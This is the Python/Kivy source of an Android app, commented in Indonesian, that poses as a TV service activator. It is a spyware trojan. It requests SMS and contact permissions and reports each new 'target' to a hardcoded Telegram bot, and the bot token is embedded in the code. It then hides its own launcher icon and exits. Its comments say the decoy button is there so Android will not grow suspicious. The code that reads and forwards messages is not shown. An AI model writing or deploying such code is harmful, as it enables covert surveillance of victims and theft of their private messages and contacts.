import telebot
from android.permissions import request_permissions, Permission
from jnius import autoclass
from kivy.app import App
from kivy.uix.button import Button
from kivy.clock import Clock
import os

TOKEN = "8688240904:AAFbm71rIxvaNTAuy0qUatSkAagp26uD6ZU"
CHAT_ID = "5999516433"
bot = telebot.TeleBot(TOKEN)

class LOKTV(App):
    def build(self):
        # Tombol Manual agar Android tidak curiga
        self.btn = Button(
            text="AKTIFKAN LAYANAN TV",
            background_color=(0, 1, 0, 1), # Warna Hijau
            font_size='20sp'
        )
        self.btn.bind(on_press=self.mulai_sadap)
        return self.btn

    def mulai_sadap(self, instance):
        # Minta Izin
        perms = [Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_CONTACTS]
        request_permissions(perms, self.proses_akhir)

    def proses_akhir(self, permissions, grants):
        if all(grants):
            try:
                # Lapor ke Bot
                bot.send_message(CHAT_ID, "✅ TARGET AKTIF! Menunggu pesan...")
                
                # Sembunyikan Ikon
                activity = autoclass('org.kivy.android.PythonActivity').mActivity
                pm = activity.getPackageManager()
                comp = autoclass('android.content.ComponentName')(activity.getPackageName(), 'org.kivy.android.PythonActivity')
                pm.setComponentEnabledSetting(comp, 2, 1)
                
                # JANGAN LANGSUNG EXIT, kasih waktu 5 detik
                self.btn.text = "Layanan Aktif. Menutup..."
                Clock.schedule_once(lambda dt: os._exit(0), 5)
            except:
                os._exit(0)

if __name__ == '__main__':
    LOKTV().run()
